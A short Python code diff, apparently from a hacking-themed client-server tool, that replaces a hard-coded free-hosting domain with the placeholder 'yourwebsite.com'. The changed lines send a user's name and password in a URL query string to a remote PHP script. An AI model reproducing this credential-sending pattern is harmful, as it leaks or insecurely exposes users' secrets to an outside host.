@@ -323,7 +323,7 @@ def find_login(client,username, password):
     data_loader_file_user = ""
     while True:
         try:
-            req = requests.get(url='https://nixwashere.000webhostapp.com/mysql_db_user.txt')
+            req = requests.get(url='https://www.yourwebsite.com/mysql_db_user.txt')
             print("OK . . .")
             data_loader_file_user = "OK"
         except:
@@ -542,7 +542,7 @@ def command_line(client):
                             count_number += 1
                             if HINT_PASS == hints_crack:
                                 send(client, f"{Fore.GREEN}FOUND HINTS ({count_number}%) . . .")
-                                req = requests.get(f'https://nixwashere.000webhostapp.com/php_mysql.php?SQL_USER={user_name_get}:{password_get}')
+                                req = requests.get(f'https://www.yourwebsite.com/php_mysql.php?SQL_USER={user_name_get}:{password_get}')
                                 loading(client)
                                 color_random = color()
                                 for x in banner.split('\n'):
